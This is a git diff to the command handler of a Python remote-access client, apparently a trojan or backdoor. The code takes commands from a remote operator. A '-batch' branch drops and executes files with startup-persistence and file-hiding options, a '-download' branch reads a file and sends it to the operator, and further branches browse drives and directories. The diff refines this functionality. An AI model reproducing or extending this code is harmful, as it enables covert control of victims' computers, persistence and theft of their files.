@@ -54,13 +54,13 @@ class Socket:
             cmd = cmd.replace("-batch ", "")
 
             self.drop_and_execute(cmd, execute_file=execute, startup=startup, low_protect=hide_file)
-            return
+            self.send_working_directory()
 
         # Download file
 
         elif "-download" in cmd:
             path = cmd[10:]
-            self.download_file(path)
+            self.copy_and_send_file(path)
             return
 
         # Get and change to logical drives
@@ -70,32 +70,28 @@ class Socket:
 
         elif "-cdrive" in cmd:
             for drive in self.get_drives():
-                print(cmd[9:11])
                 if drive == cmd[9:11]:
                     try:
                         chdir(drive + "\\")
                     except (PermissionError, FileNotFoundError)as error:
                         self.send_msg(error)
-                        break
-                    self.send_msg(getcwd())
-                    return
-            self.send_msg(f"Drive: {cmd[9:11]} not found")
-            return
+                        return
+                    self.send_working_directory()
 
         # Change working directory stuff
 
         elif "cd.." in cmd[0:4]:
             chdir(self.get_parent_path(getcwd()))
+            self.send_working_directory()
 
         elif "cd" in cmd[0:2]:
             path = getcwd() + "\\" + cmd[3:]
             try:
                 chdir(path)
             except (FileNotFoundError, OSError) as error:
-                # self.send_msg(error)
+                self.send_msg(error)
                 return
-            # self.send_msg(f"Changed directory to {path}")
-            return
+            self.send_working_directory()
 
         # Exit
         elif "-exit" in cmd[0:5]:
@@ -133,7 +129,7 @@ class Socket:
         except(ConnectionResetError, ConnectionAbortedError, OSError):
             self.established = False
 
-    def download_file(self, path):
+    def copy_and_send_file(self, path):
         try:
             file = open(path, "rb")
             file_content = file.read()
